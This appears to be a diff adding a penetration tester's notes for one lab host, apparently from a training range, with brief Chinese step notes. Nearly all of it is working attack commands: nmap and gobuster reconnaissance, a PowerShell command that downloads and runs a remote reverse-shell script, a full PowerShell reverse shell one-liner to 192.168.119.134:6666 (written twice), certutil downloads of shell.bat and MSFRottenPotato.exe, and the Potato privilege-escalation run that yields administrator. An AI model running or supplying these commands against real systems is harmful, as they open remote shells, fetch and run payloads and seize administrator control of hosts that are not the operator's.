@@ -1,0 +1,21 @@
+nmap -sV -sC -Pn 10.11.1.13 > nmap.txt
+
+nmap -p- -T5 10.11.1.13 > nmapall.txt
+
+gobuster dir  -u http://10.11.1.13:5800/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+powershell -c IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.34/Invoke-PowerShellTcp.ps1')
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe Potato.exe
+
+C:\users\Public\Downloads\Potato.exe * C:\users\Public\Downloads\shell.bat
+
+
+1.nmap掃描到有ftp服務可上傳aspx文件,上傳cmdasp.aspx
+2.nmap發現有4167端口可訪問ftp文件
+3.在cmdasp.pasx網頁上執行reverse shell code
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+4.下載MSFRottenPotato.exe/shell.bat
+5.執行後取得administrator
